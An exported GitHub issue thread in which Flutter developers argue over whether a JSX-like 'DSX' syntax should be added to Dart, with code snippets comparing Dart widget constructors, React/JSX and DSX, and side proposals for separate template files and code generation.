As such, I really don't see how JSX/DSX would benefit Flutter development productivity beyond just being a matter of personal preference. Both syntaxes overall are roughly equivalent in verbosity, and where one loses verbosity in specific instances it makes up for it in clarity (the closing XML tags, for example). It largely boils down to if someone is coming to Flutter from a web-oriented background (React/RN, Angular, etc.) or from a native background (Java/Kotlin/Swift, WPF/UWP, etc.) that will determine which approach they would prefer. Even on this thread alone, there are a lot of user stories that say they were extremely skeptical of JSX at first but after using it for a few months changed their opinion to ""can't do without"". (Though the cynical part of me wants to point out that the same thing could very well happen to them for the native Dart approach if they gave it a chance.)

All that being said, I can't really see myself agreeing that DSX should become officially supported by the Flutter team as an alternative to native UI constructors. While it's perfectly fine as a third-party solution (and all the props to @cbazza for actually implementing it), it doesn't really fit with the core nature of Flutter as a non-web-technology-based platform. As such, more power to anyone who wants to use DSX in their own projects, but I would side with the mindset that there are plenty of other more important things the Flutter team could and should be spending their time on.

Now with THAT being said, while I don't really agree with DSX being officially supported, I do think that there should be an official UI format of _some_ kind. As [@birkir pointed out](https://github.com/flutter/flutter/issues/11609#issuecomment-390305227), nearly every major native UI platform, be it desktop or mobile, has a UI format in addition to the direct code-based approach (and most of them are pre-processed into the code-based approached anyway). Having separate UI files from logic files has always been the recommended way to embrace the MVVM pattern (which, incidentally, is one thing that has always rubbed me the wrong way about JSX). What I would argue, therefore, is that Flutter have something similar - instead of an inline UI DSL format, it should have a separate UI format that is intended to go into its own file away from the Dart code.

As part of this line of thinking, I've actually done some work this past weekend along that end. If I could be allowed to shill for a moment, [I developed a project that I've coined ""FLUI"" that is my attempt to show what such a format might look like](https://github.com/andrewackerman/flui). Rather than going with an existing DSL (or a modified version), I developed an entirely new one that takes inspiration from YAML and I've tried my best to keep close to the ""feel"" of the Flutter-constructor-approach layout. Granted, it's a _very_ early implementation, so I don't really expect it to not have a massive slew of issues, but I've included the source for the processor script (written in C#/.NET Standard) so that people can play with it if they want to. :)"
3007	"As both a React/RN and a Flutter user, I heavily disagree with the idea of  ""DSX"".


DSX would bring **nothing**. JSX is used in react because the JS syntax is horrible. But in the case of Flutter, widgets creations is super easy.

The classical :
```dart
Widget build(BuildContext context) {
  return Center(
    child: Text(""foo""),
  );
}
```

it is already out of the box readable, easy to write, type/generic compatible, and without any unneeded duplication.


The only complain you could possibly have with the current syntax is ""It is hard to know where is the closing parenthesis of a widget""

But then again, dart plugin of the officially supported IDEs solves this problem. So that when we open the code from before in say vscode, we'll see


```dart
Widget build(BuildContext context) {
  return Center(
    child: Text(""foo""),
  ); // Center
}
```


____

As for the ""It's hard to differenciate casual code from UI code"", react rules apply to flutter too :

Widgets should be either dumb or smart. Smart widget don't have UI logic. Dumb widgets have nothing but UI logic. 

If you follow this pattern, you should never fall into a situation where you fail to differentiate UI from the rest.
This is even more true when following something like BLoC pattern; which heavily enforce separation of business and UI."
3008	"> JSX is used in react because the JS syntax is horrible

Very opinionated statement and simply not true.

<hr />

```js
render() {
  return React.createElement(Container, { padding: EdgeInsets.all(20.0) },
    React.createElement(Text, { style: { color: Colors.black } },
      'foo'
    )
  );
}
```

```dart
Widget build(BuildContext context) {
  return Container(
    padding: EdgeInsets.all(20.0),
    child: Text(
      'foo',
      style: TextStyle(color: Colors.black)
    ),
  );
}
```

<hr />

```jsx
render() {
  return (
    <Container padding={EdgeInsets.all(20.0)}>
      <Text style={{ color: Colors.black }}>foo</Text>
    </Container>
  );
}
```

```dart
Widget build(BuildContext context) {
  return (
    <Container padding={EdgeInsets.all(20.0)}>
      <Text style={TextStyle(color: Colors.black)}>{'foo'}</Text>
    </Container>
  );
}
```"
3009	"> Very opinionated statement and simply not true.

There's a lot of unneeded characters in the default react syntax. 
Let's compare words repetition and characters count for each syntax (excluding function definition, indentation and 'return')


React without JSX: 
  - 133 characters, including 3 parenthesis, 3 brackets, 3 `:`, 4 `,` and 11 spaces
  - `React.createElement` written twice

JSX: 
  - 104 characters, with  2 parenthesis, 3 brackets, 1 `:`, 4 `<>` and 5 spaces
  - `Container` and `Text` written twice

Dart: 
  - 99 characters, with 2 parenthesis, 4 `:`, 3 `,` and 4 spaces
  - No repetition


In term of characters, the obvious winner here is dart syntax.

____


Now we also have to take other dart specifics into account.


Dart types single child vs multi-child, has `const` constructors and allows generics and even positioned parameters. JSX supports none of these.

A few examples that would badly convert to JSX :

Not always `children`: 
```dart
Scaffold(
  appBar: AppBar(),
  body: Container(),
)

OR

SingleChildScrollView(
  child: Container(
    height: 100.0,
  ),
)
```

`const` constructor on widget themselves
```dart
const Padding(
  padding: const EdgeInsets.all(4.0),
)
```

generics
```dart
NotificationListener<ScrollNotification>(
  onNotification: (foo) {
    
  },
  child: child,
)
```

positioned props :
```dart
Text(""foo"")
```


Named constructor 
```dart
Positioned.fill(
  child: Container(),
);
```

builders (dart doesn't support union type so `children` can't be both a Widget and function)
```dart
Builder(
  builder: (context) => Container(),
)
```"
3010	"@rrousselGit

As mentioned several times before DSX is simply a different
syntax and it is a superset of Dart, so everything you can do with
Dart you can do it inside DSX. You can also mix and match both
syntaxes as you see fit. Obviously you didn't even bother to check 
out what are some of the DSX features that were done to support
Dart: 
https://spark-heroku-dsx.herokuapp.com/index.html

-1---------------------------------------
In Dart:
```dart
Scaffold(
  appBar: AppBar(),
  body: Container(),
)

OR

SingleChildScrollView(
  child: Container(
    height: 100.0,
  ),
)
```

In DSX:
```jsx
<Scaffold
  appBar={<AppBar/>}
  body={<Container/>}
/>

OR

<SingleChildScrollView>
  <Container
    height={100.0}
  />
</SingleChildScrollView>
```

-2---------------------------------------
In Dart:
```dart
const Padding(
  padding: const EdgeInsets.all(4.0),
)
```

In DSX:
```javascript
const Padding(
  padding: const EdgeInsets.all(4.0),
)
```

-3---------------------------------------
In Dart:
```dart
NotificationListener<ScrollNotification>(
  onNotification: (foo) {
    
  },
  child: child,
)
```

In DSX:
```jsx
<NotificationListener<ScrollNotification>
  onNotification={(foo) {
    
  }}
  child={child}
/>
```

-4---------------------------------------
In Dart:
```dart
Text(""foo"")
```

In DSX:
```jsx
<Text [""foo""]/>
```

-5---------------------------------------
In Dart:
```dart
Positioned.fill(
  child: Container(),
);
```

In DSX:
```jsx
<Positioned.fill>
  <Container/>
</Positioned.fill>
```

-6---------------------------------------
In Dart:
```dart
Builder(
  builder: (context) => Container(),
)
```

In DSX:
```jsx
<Builder
  builder={(context) => <Container/>}
/>
```


"
3011	"#But then the argument of having an easier conversion from react to flutter is invalid. As JSX is radically different from your prototype :

```
<MyAppBar>
    <title:Text [] style={Theme.of(context).primaryTextTheme.title}>
        Example title
    </title:Text>
</MyAppBar>
```

And none of your examples here or from your link actually simplify the code or improves readability

As much as I can relate to your feeling of missing JSX (got the same when starting flutter), after some experience, the native syntax feels pretty good actually


____


As a side note, there's a much better solution to your separation of concern. That is a template file
You could have an xml/yaml file next to your widget. And then use the awesome code generation tooling dart provides.


I'd rather prefer a :

```dart
// main.dart
import 'package:flutter/material.dart';

part 'main.g.dart';

class MyState extends StatefulWidget {
  @override
  _MyStateState createState() => _MyStateState();
}

class _MyStateState extends State<MyState> {
  @override
  Widget build(BuildContext context) {
    return $myStateStateTemplate(theme: Theme.of(context));
  }
}
```

combined with a 

```
// main.xml
@theme ThemeData

<Container  color={@theme.cardColor} />
```

which then using a custom code-gen generates the following dart file :

```dart
part of 'main.dart';

Widget $myStateStateTemplate({ThemeData theme}) {
  return Container(
    color: theme.cardColor,
  );
}
```


The end result is even better than a ""DSX"" for separation of UI/logic. It's better for potential UI generators too.  And it's much easier to implement using `built`. 
"
3012	">  As JSX is radically different from your prototype :

Really !!! The only thing radical in these discussions has been the reaction of the naysayers.

As it's stated in the title of this ticket, DSX is JSX-like, it is not JSX-identical or else it would had been called JSX; and the additions to it are minor and provides options to developers. 

You could write it like:

```jsx
<MyAppBar>
    <title:Text [] style={Theme.of(context).primaryTextTheme.title}>
        Example title
    </title:Text>
</MyAppBar>

or

<MyAppBar>
    <title:Text ['Example title'] style={Theme.of(context).primaryTextTheme.title}/>
</MyAppBar>

or

<MyAppBar
    title={<Text [] style={Theme.of(context).primaryTextTheme.title}>
        Example title
    <Text>}
/>

or

<MyAppBar
    title={<Text ['Example title'] style={Theme.of(context).primaryTextTheme.title}/>}
/>

```

Hummmm, you seem to be confusing 'separation of concern' with 'separation of technology'. These things are very different; you separating dart code and markup code in different files, is simply 'separation of technology' and provides none of the benefits of 'separation of concerns'. A concern here would a component/widget that encapsulates reusable code cleanly, it doesn't matter that inside that component/widget it is using different technologies. 

Also separating technologies as you recommend is highly inferior to JSX/DSX which uses the host language for all of its imperative constructs (for loops, function calls, if statements, etc).  

"
3013	"After much of code and examples posted here ([especially](https://github.com/flutter/flutter/issues/11609#issuecomment-406831402)), I come to conclusion, that JSX adds much more value to JS in contrast to DSX and Dart. But one feature is very important from my point of view: Closing tags. Like:

```
<SingleChildScrollView>
  <Container
    height={100.0}
  />
</SingleChildScrollView>
```

reduces a LOT of cognitive complexy in deep structures like [here](https://github.com/flutter/flutter/issues/11609#issuecomment-351441265) in contrast to:

```
SingleChildScrollView(
  child: Container(
    height: 100.0,
  ),
)
```

But well, if you use it like this:

```
<Scaffold
  appBar={<AppBar/>}
  body={<Container/>}
/>
```

there is a small profit."
3014	"> As it's stated in the title of this ticket, DSX is JSX-like, it is not JSX-identical 

You missed my ""But then the argument of having an easier conversion from react to flutter is invalid.""

Half of the arguments for DSX is ""JSX is popular in react, we need this here too"". But you're proposing something different (and more complex) from JSX. 
The other half is about separating UI from code; which a template file can do too.

> Also separating technologies as you recommend is highly inferior to JSX/DSX which uses the host language for all of its imperative constructs (for loops, function calls, if statements, etc).

Not true. You could do `if` and stuff inside your template file. Look at `cshtml` or angular templates. 


The thing is a template file, as long as you already have a parser for it, could be implemented for flutter in less than a week fully working.
Be it yaml, xml, cshtml, or html with directives. 


While a DSX would require a lot of work.  

____


@Bessonov They recently added virtual comments on supported IDEs to mock closing tag.

So in your vscode you'll see the following :

```dart
SingleChildScrollView(
  child: Container(
    height: 100.0,
  ), // Container
) // SingleChildScrollView
```


The benefits of closing tags. Without having to type them"
3015	"@rrousselGit 

> They recently added virtual comments on supported IDEs to mock closing tag.

Yeah, I've seen that in cited comment. But it's not the same. This introduce an align shift and disturb reading flow. And this doesn't help me in other IDEs and text processors.

> The thing is a template file

IMHO templates suffers from NIH syndrom. I don't say that approach to mix PHP and HTML is the right way to do that. But react shows with JSX how it can be done better."
3016	"@rrousselGit 

> You missed my ""But then the argument of having an easier conversion from react to flutter is invalid.""

No, I didn't miss the comment at all, it just makes no sense you telling me that people coming from JSX will find DSX too complex.

> Half of the arguments for DSX... 

There are many reasons to choose DSX but with alternatives people will pick what they prefer for whatever reason they have.

> Not true. You could do if and stuff inside your template file. Look at cshtml or angular templates.

> The thing is a template file, as long as you already have a parser for it, could be implemented for flutter in less than a week fully working.
> Be it yaml, xml, cshtml, or html with directives.

> While a DSX would require a lot of work.

Totally opposite, DSX only implements 2 xml transforms and gains everything else for free from the hosting language. Imagine the effort trying to re-implement the power of Dart inside your new templating language. No thanks, I'll take Dart.
 




"
3017	"> No, I didn't miss the comment at all, it just makes no sense you telling me that people coming from JSX will find DSX too complex.

The same thing applies to the current dart implementation.


____

Anyway, I don't think we can convince each other here. So I'll just list a few more reasons as to why I dislike JSX in flutter and then ""wait and see"".


**1. Widget creation is different from React**

In react, it's the library that handles components creation. JSX is fine because it says ""Don't bother about how things work. We do things for you"". 

In flutter that is not the case. We manually instantiate a new widget every on build call. **This is really important to understand, and JSX would make it less clear.**

And, in the continuation of that logic :

**2. Peoples may think `<Foo />` does something special that `new Foo()` don't**

 `<Foo />`  in a method feels special. It seems like it does something extraneous built-in in the framework. Which is true in react, where  components are wrapped into a `React.Element`.
This translates in react into `<Foo />` != `new Foo()` and don't have direct access to `Foo`.

This doesn't apply in flutter and may cause confusion. 

Also :
```
<Foo>
  <Bar />
</Foo>
```

In react, if `Foo` never uses its child then `Bar` is never instantiated. And `Foo` is instantiated after the `render` method returns.
While in flutter this is the opposite. Both `Bar` and `Foo` are created immediately 

This would potentially lead in React developers making un-optimized flutter code.

**3. In general Dart/flutter is not JS/react**

If we add JSX in dart, I can already see the issues about type union or be able to do
 `return foo && <Component />` or the upcoming async rendering in react.
Justified with a ""we already have JSX so we can have that too !""

I'd prefer a proprietary syntax or no syntax at all, for the sake of not having to implement the latest JSX/react feature in dart


**4. JSX makes some dart specifics unclear**

A small example, `Scaffold` requires for `appbar` a `PrefferedSizeWidget`.
If we created `Scaffold` using JSX, peoples would expect that you can replace any given JSX with another. Which is not true

I mean, it makes it very unclear why we can do 
```
<Scaffold
  appbar={<AppBar />}
/>
```

but not 
```
<Scaffold
  appbar={<Container />}
/>
```
"
3018	"@rrousselGit

> Anyway, I don't think we can convince each other here. So I'll just list a few more reasons as to why I dislike JSX in flutter and then ""wait and see"".

I disagree with a lot of what you said but I appreciate your effort since you are taking the time to think deeply into the issue.

> 1. Widget creation is different from React

To me it doesn't matter because this is just an implementation detail, conceptually once you see some XML, in React it is a Component, in Flutter it is a Widget. 

> 2. Peoples may think <Foo /> does something special that new Foo() don't

I think people will learn pretty quickly that Dart/DSX is not Javascript/JSX.

> 3. In general Dart/flutter is not JS/react

Yes, we finally agree on something but even though they are different the common thread is that they are declarative UI frameworks and I think declarative tree structures are handled nicely with JSX/DSX. It keeps you on the declarative programming way of thinking.

> If we add JSX in dart, I can already see the issues about type union or be able to do `return foo && <Component />` or the upcoming async rendering in react.
Justified with a ""we already have JSX so we can have that too !""

We are not adding JSX in Dart, we are adding DSX, it is different but has similarities to JSX and familiarity is a huge thing.

> I'd prefer a proprietary syntax or no syntax at all, for the sake of not having to implement the latest JSX/react feature in dart.

So with that reasoning why are you using Dart? it looks pretty similar to Java and yet it is different than Java; the heck with it, let's scrap all of these Java keywords and concepts and come up with something vaguely similar to Erland that you can only program with one hand while doing a pretzel yoga move on top of Mount Everest ;) 
 
> 4. JSX makes some dart specifics unclear

Not really, if you connect incomparable Widgets the Dart compiler will spit error messages just like if you did it in plain Dart. I can not emphasize enough that DSX is simply thin syntactic sugar, there is no magic, just a difference syntax to the same thing.

"
3019	@cbazza I spent hours reading your posts and I really appreciate your effort on this issue. But I think it is (kind of) easy to end the argument. Remember that flux was the official state management solution for react but now everyone is using redux? And how many navigation libs are there for react-native? Just make a DSX repo and let react devs jump in.
3020	"@rrousselGit 

I've never seen the `part`/`part of` syntax in Dart before, and I'm having trouble finding any documentation for it. Is it something that Dart/Flutter officially supports? I'd love to use something like that in FLUI.

--------------------

@cbazza 

You keep going around in circles with the DSX justification. DSX is not JSX. DSX is JSX-like. DSX is meant to be a familiar syntax for React developers. DSX is merely think syntactic sugar for Dart. People will learn that DSX is not JSX. (And so on.)

While I get the point you are trying to make with all those explanations, I think the fact that you have to keep making them reveals a major issue regarding the nature of DSX in general, and it's a point that **rrouselGit** brought up as well. Even as you keep saying that DSX is _not_ JSX, people who find it are going to think that it is, and that's a problem. JSX, and the people who use it, come from an ecosystem that is so conceptually different on fundamental levels from Dart/Flutter. As such, developing a feature for ""familiarity"" is not necessarily a good thing. One of the more apparent reasons for such is, as was pointed out, people are going to try something like this:

    Widget build(BuildContext context) {
        return isDialogVisible && <Widget>...</Widget>;
    }

Because they come from Javascript/JSX, they expect that syntax to work in DSX. When it doesn't, it becomes a point of cognitive dissonance which may actually _hurt_ their interest in not just DSX but in Flutter as a whole. Familiarity is beneficial when it's used as a means to ease people into something new, but that can be a double-edged sword - when 90% of the features are the same, the remaining 10% can serve to just frustrate and annoy.

Another issue with DSX is that it is not likely to be a seamlessly integrated feature any time soon, regardless of if it's a third-party plugin or if it gets officially adopted by Flutter. As you've said yourself, in order for it to truly work with the Flutter debugging and deployment process, it needs official support from not only the Flutter team but also the Dart team. Failing that, without pre-processing and tooling support, the only way DSX would work is with external manual conversion tools, which is just another (potentially lengthy) step that developers will have to go through.

---------------------

While typing this up, there's another thing that occurred to me. There have been several pro-JSX people in this thread that have praised JSX, saying that the ""separation of concerns"" approach to UI design is really the only way they will ever consider developing UIs again. If that's the case, why is React the only framework with market presence that is using it? Both native and cross-platform mobile app frameworks have stuck with their storyboards, their XML files, their XAML files, and other such UI definition DSTs. Even other popular JS frameworks like Angular and the up-and-coming Vue still do the ""separation of technologies"" approach. React developers talk like JSX is the way of the future, but I've yet to see it pop up anywhere other than in React in a framework that has gotten any real traction."
3021	"@andrewackerman 

`part`/`part of` is an existing dart feature. It somehow joins two files into one. Usually used for code generation.  

There are a few real cases scenarios that use such technique.  Like `json_serializable` which generates a `toJSON` method and a `fromJSON` factory for classes based on their properties.

`part`/`part of` don't really do anything on its own. The interesting part is when you combine it to something like [source_gen](https://github.com/dart-lang/source_gen)."
3022	"@sunnylqm 

I don't think putting code on a repo would solve my problem because the current issue is about properly integrating DSX with Flutter tools as to provide a great developer experience with debugger, auto-complete, etc. working on .dsx file. 

Telling users that they can use DSX but can't use debugger or enjoy auto-complete is a non starter for me. If anybody wants to help, what I need is to figure out a way to add full preprocessing support (with source map) to Dart Tools and VS Code Dart plug in. Once the tools support that DSX or any other transpiling language (any language that is a superset of Dart but compiles everything down to Dart) would just work. 

@andrewackerman 

I don't need to justify anything, I am very confident that DSX will be a hit and there are almost 100 people interested in it on this ticket alone.

> Failing that, without pre-processing and tooling support, the only way DSX would work is with external manual conversion tools, which is just another (potentially lengthy) step that developers will have to go through.

The DSX transpiler is blindingly fast and can transform .dsx files into .dart files faster than you can blink, so speed is not a problem; just trying to get feature parity as to make it a no-brainer for people to use DSX.

> If that's the case, why is React the only framework with market presence that is using it? Both native and cross-platform mobile app frameworks have stuck with their storyboards, their XML files, their XAML files, and other such UI definition DSTs. 

Just make a timeline and you will see the UI development evolution. Android and iOS development via their current ways started over 10 years ago so it uses 10 years old techniques (totally imperative techniques). The Reactive UI development (declarative) techniques started to appear for the web around 8 years ago. React appeared 5 years ago and it was the first Reactive framework to combine technologies seamlessly with JSX. Vue is now the latest Reactive framework that supports the older 'separation of technologies' techniques but it also supports JSX. On mobile Flutter is the latest and it uses Reactive framework techniques as React and it could take advantage of DSX just as Vue takes advantage of JSX. Vue is killing Angular because it is providing choice to developers and not being overly opinionated.

The problem with separate template files is that the imperative programming constructs there (if, for loop, etc) are so weak compared to what's available on the programming language used for the business logic. Combining the 2 in the way JSX does, to me, is clearly the future.

> React developers talk like JSX is the way of the future, 

It is !!!

> but I've yet to see it pop up anywhere other than in React in a framework that has gotten any real traction.

Vue uses JSX


"
3023	"@cbazza 

> I don't need to justify anything, I am very confident that DSX will be a hit and there are almost 100 people interested in it on this ticket alone.

I'm not saying you _do_ need to justify anything. Back when you were insisting that the Flutter team pick up this proposal and implement it themselves, yeah, I would've said you had a fair amount of justifying to do. Now that you are trying to do it yourself, you can do whatever you want for what ever justification you think is sufficient, and more power to you. I'm merely stating the reasons I see that it might not be as easy or as popular as you seem to think it will be, and I am putting the ball in your court to defy them.

> The DSX transpiler is blindingly fast and can transform .dsx files into .dart files faster than you can blink, so speed is not a problem; just trying to get feature parity as to make it a no-brainer for people to use DSX.

I assume that, at this point, you've tested it so far on UIs and Apps that are trivial in size. What about non-trivial ones? What about ones that fall within edge cases? Also, the actual time that the process takes is not the only relevant part - just the fact that the developer has to go through another checklist of manual actions before they can build is enough of a turn off for many people.

You also have yet to actually release the source code of the project, so no one's been able to go through your process, double-check your findings, and suggest improvements. At this point, all anyone can really do is take you at your word that it is both convenient and performant.

> Vue uses JSX

I've been using Vue for coming close to a year now, and in that time I have gone through a good number of open source project repos to see how different things are done. While I don't consider myself a Vue master by any means, what I will say is that in not a single one of them have I ever seen JSX actually utilized - people seem to massively prefer the `.vue` approach (template-script-styling) over the render+JSX approach. I didn't even know myself that Vue even supported JSX (via a babel plugin at least) until after your reply I did some digging through the Vue documentation and discovered a tiny snippet of information on it in the [render function section](https://vuejs.org/v2/guide/render-function.html#JSX).

But this is irrelevant to my overall point. Vue is still a Javascript framework. Flutter is most assuredly not. As such, there are a lot of reasons that make JSX the newest greatest thing in a Javascript-centric environment that won't translate to Dart+Flutter, many of which have already been covered in this thread.

> It is !!!

Until I see it catch on in a non-Javascript development environment, I shall respectfully disagree."
3024	"> Vue uses JSX

Vue specify has a broad variety of usages. JSX is just ""there"". But it's not the dominant syntax
You could plug JSX to Angular if you wanted to.  Although nobody does


> React developers talk like JSX is the way of the future,
> It is !!!


A big candidate for the future is web-components. And they are used directly in html similar to what you'd find in Angular or the most common form of Vue"
3025	"@andrewackerman 

> just the fact that the developer has to go through another checklist of manual actions before they can build is enough of a turn off for many people.

Who said anything about manual actions? Didn't I make myself clear that I am trying to get complete seamless IDE integration (best possible user experience for developers). 

> You also have yet to actually release the source code of the project, so no one's been able to go through your process, double-check your findings, and suggest improvements. 

How does that have anything to do with people using DSX? I've used JSX for over 2 years and couldn't care less for its source code. Do you need to look at the source code of the Dart compiler to be able to program in Dart?

> what I will say is that in not a single one of them have I ever seen JSX actually utilized - people seem to massively prefer the .vue approach (template-script-styling) over the render+JSX approach.

JSX is a new addition so it will take time to spread but the important point to get is that Vue accepts other approaches without forcing developers to use 'the correct way and only way' that things should be done in Vue.
 
> Vue is still a Javascript framework. Flutter is most assuredly not.

Riiiiight, so instead of JSX you use DSX with Flutter.

@rrousselGit

> A big candidate for the future is web-components.

Web components are zoobies, dead but still walking; they are as widespread as kangaroos in Canada. I could go on for days but to avoid digressing...
https://dmitriid.com/blog/2017/03/the-broken-promise-of-web-components/
"
3026	"@cbazza 

> Who said anything about manual actions? Didn't I make myself clear that I am trying to get complete seamless IDE integration (best possible user experience for developers).

You also said that you needed preprocessing support from the Flutter/Dart team in order to do so. Am I incorrect in that?

> How does that have anything to do with people using DSX? I've used JSX for over 2 years and couldn't care less for its source code.

JSX was developed by Facebook for React, put through a rigorous proposal/design/implementation/iteration process, and then released into the world years before you got your hands on it. It's been rigorously tested and proven time and time again in real world environments. It's a mature technology. There's no reason to demand to see a spec sheet for something like that.

DSX, on the other hand, is being developed today by you and a handful of people. You've waxed eloquently about what it can and will be able to do, but all we've actually _seen_ is a small handful of purpose-built code snippets and your word that they were generated by the transpiler. People who have even want to try it out and suggest possible changes or improvements aren't able to do so, so they have no reason to support your efforts beyond ""Yay JSX!"".

I'm not accusing you of lying or anything, I'm just saying that JSX has earned a level of faith that DSX has not, so how are you going to turn some heads if you don't let people tinker with it? 

> JSX is a new addition so it will take time to spread but the important point to get is that Vue accepts other approaches without forcing developers to use 'the correct way and only way' that things should be done in Vue.

JSX has been in Vue for almost 2 years now. And unlike Vue itself, JSX is a pre-existing technology that needs no introduction, especially for people familiar to React. If JSX was going to take the Vue.js world by storm, I can't help but feel it would've done so by now. (Particularly if it's any indication that as many people are clamoring for JSX in Flutter as you claim.)

> Riiiiight, so instead of JSX you use DSX with Flutter.

JSX and DSX are the same syntactic concept. The problem is that, where JSX was built on a weakly-typed dynamic language like JavaScript, DSX is being built on a strongly-typed static language like Dart. That means there are lots of problems DSX will have to account for that JSX didn't have to if it's going to be anything other than a niche ""JSX for Flutter"" implementation, and it's going to take some _ingenious_ modifications to make DSX really work without making it too bloated to justify claiming that it's more visually concise.

And to address the ""DSX is just Dart, if DSX can't do something, just use Dart"" rebuttal, then my counter-rebuttal would be if I have to keep falling back to Dart whenever I run into a scenario that DSX doesn't handle, then why shouldn't I just use Dart all the time?

And to address the rebuttal for *that* reading ""you can if you want to, DSX is just an option"", then you are really selling yourself short. Even if it really is just going to be ""an option"", it still needs to bring something to the table that is going to convince people to use it. You yourself said that DSX is not JSX, so people who want just JSX aren't going to get what they want. **That** means there needs to be some tangible reasons beyond the ""JSX-like appeal"" for people to want to use it. 

If you're just building a tool that you yourself want to use, then all this is moot and you can go nuts. But if you are actually building something you intend for other people to use, then you need to put it in a solid form why you think they should.

> Web components are zoobies, dead but still walking; they are as widespread as kangaroos in Canada. I could go on for days but to avoid digressing...

Somewhat off-topic, but I would like to point out that web components really are a promising look at the future, even if support for them is getting added slower than tar. Think about it this way: React does what it does because it essentially implements the idea of web components in Javascript-only. Imagine how much better it would be if those features were supported by the browser and benefitted from non-sandboxed performance and not having to operate through DOM manipulation? (Granted it might be another 20 years before we find out, but still...)"
3027	"@andrewackerman

Sorry dude I don't have the time to argue endlessly and repeat what I said before over and over; we won't end up in agreement anyways so best of luck with your FLUI.

> You've waxed eloquently about what it can and will be able to do, but all we've actually seen is a small handful of purpose-built code snippets and your word that they were generated by the transpiler. 

The online DSX transpiler has been live since Feb 2018 and anybody can use it so there is no need to take my word for anything. Press 'Compile' and it compiles what its written on the left panel and places results on right panel. Open debugger and you will see the AST written out.
https://spark-heroku-dsx.herokuapp.com/index.html

> The problem is that, where JSX was built on a weakly-typed dynamic language like JavaScript, DSX is being built on a strongly-typed static language like Dart. 

It makes no major difference at all, like the OOP (Object Oriented Programming) concept and syntax for 'classes'. It's almost identical in typeless Javascript or typed Dart; same can be said for 'if' statement, 'for' statement, etc

> it still needs to bring something to the table that is going to convince people to use it. 

Apparently it already does for 100 people in this ticket; and that's 100 times larger than just me using it; good enough for me.


"
3028	"@cbazza 

> Sorry dude I don't have the time to argue endlessly and repeat what I said before over and over; we won't end up in agreement anyways so best of luck with your FLUI.

I'm not arguing with you just for the sake of argument or because of some deep-seated anti-JSX bias. I'm trying to get you to answer questions that need to be answered. You are developing a tool that you presumably intend for other people to use, yet you still haven't offered a compelling reason _why_ they should use it beyond the vague and subjective benefits of ""familiarity"" and ""because it's better"". The former, as I said before, is not necessarily a good thing, and the latter is as of yet a claim made without any tangible support.

If you want your tool to be a success, it needs to be set in stone what you are doing and why you are doing it, and you need to do so in a way that it can be easily conveyed to others. That's not to say that you can't make a product until it is liked by _everyone_, but clear and concise objectives are crucial to shaping design and implementation. Otherwise you are just going to end up with a direction-less utility that will be a niche product at best and will be extremely lucky if it ends up in production code of any scale.

> The online DSX transpiler has been live since Feb 2018 and anybody can use it so there is no need to take my word for anything. Press 'Compile' and it compiles what its written on the left panel and places results on right panel. Open debugger and you will see the AST written out.

I didn't even see that that link was a working example. I've never used herokuapp before and it just looked like a gist or something, so that's on me. :P

(Though I will point out that tinkering with an online sandbox is not the same as testing the transpiler in a more practical environment.)

> It makes no major difference at all, like the OOP (Object Oriented Programming) concept and syntax for 'classes'. It's almost identical in typeless Javascript or typed Dart; same can be said for 'if' statement, 'for' statement, etc

You already had to deal with one such difference in [child strong-typing](https://github.com/flutter/flutter/issues/11609#issuecomment-403323724). What about attribute strong-typing? What about widgets in different libraries with the same name? What happens if someone makes a widget with more than one nameless positional argument? What happens if we import two libraries that have widgets with the same name? What happens in some scenario that I haven't thought of pops up to further showcase the inherent difference between systems like Javascript and Dart? I have to say, you being so flippant on this discussion point makes me worry about DSX's longevity in a real-world setting.

> Apparently it already does for 100 people in this ticket; and that's 100 times larger than just me using it; good enough for me.

Again, that's 100 people who upvoted the issue on the basis of ""Consider JSX-like syntax inside dart code"". They upvoted because they want _JSX_, and as you've been so keen to point out, DSX is not JSX. So why else would they want to use DSX? Because inline XML-like UI declaration is ""the future""? Again, I just don't see it. 

We've already covered JSX in Vue not getting any traction, but there's also the two React alternatives mentioned in the Web Components article you linked: Inferno and Preact. As far as I can tell, they have both failed to make any kind of waves at all in the JS-based web-app development world, despite also natively supporting JSX-like syntax. I really think that people need to have a long and hard look about _exactly why_ people like JSX in React, because by all accounts it just doesn't seem to be because of JSX itself. If _that_ question can be answered, then we can move forward toward ""future"" innovations rather than just frankensteining that one feature from that one library we liked into everywhere else we personally think it should be."
3029	Thinking on the amount of energy that was invested just in this discussion and what could have been done good to improve the current framework instead makes me sad.
3030	"@andrewackerman
> The problem is that, where JSX was built on a weakly-typed dynamic language like JavaScript, DSX is being built on a strongly-typed static language like Dart.

Sorry, but this isn't a problem. Furthermore, this doesn't make any sense at all. Beside of that, we use JSX with TypeScript.

@escamoteur absolutely! "
3031	@escamoteur I'm with you on this one. _The 100._
3032	"@Bessonov 

> Sorry, but this isn't a problem. Furthermore, this doesn't make any sense at all. Beside of that, we use JSX with TypeScript.

React wasn't designed for TypeScript. It was designed for Javascript. All the widget definitions, attributes, properties, and everything else was designed to be used in the dynamic environment of JavaScript, so the type safety of TypeScript doesn't introduce any new factors with how JSX interacts with React. This is yet another example of how JSX was designed for a completely different setting than what Flutter is."
3033	"@andrewackerman 
Why do you think it does matter? JSX is a way to describe interface. It's language agnostic on it's own. Look [here](https://developer.android.com/guide/topics/ui/declaring-layout). It's not JavaScript. But well, why it can't be done with JSX? (Beside there is no implementation of this (yet))

And.. you know... flow come from fb too:

> Flow is a static typechecker for JavaScript.

Please, stop selling arguments for and against extensions you've never use. I use JSX every day and I'm happy with it ATM, although I was very skeptical about it. I can imagine, that JSX evolves in other patterns, like it was with AngularJS.

And maybe this topic helps to find better pattern for Dart? DSX is just one proposal. Look at builder pattern example above or other language tweaks presented here. And, well, maybe your [flui](https://github.com/andrewackerman/flui) is a better way? I don't know. **But let's find it out and help to each other to improve their suggestions instead of discussing about bad things in someones else proposal.**"
3034	I would like to propose close this topic and open new umbrella topic with limited conversation. All proposals to improve the way, how flutter may be used, discuss in own topics objectively with love and without hate.
3035	"Yeap, the amount of hate here is epic, just consider this:
There are 3587 open tickets, if you sort them by ""thumbs down"" you get
1 (this one) with 57 ""thumbs down""
3586 (other tickets) with 1 or less ""thumbs down""

"
3036	"@Bessonov 

> Why do you think it does matter? JSX is a way to describe interface. It's language agnostic on it's own. Look here. It's not JavaScript. But well, why it can't be done with JSX? (Beside there is no implementation of this (yet))

It's a way to describe UI _in Javascript_ (hence the ""JS"" part of the name). And no, since it's an inlined DSL, it is _not_ language-agnostic. And even if it was, that still doesn't make it  the ""better choice"", since there are plenty of truly language-agnostic DSLs out there that would be woefully inadequate for UI declarations.
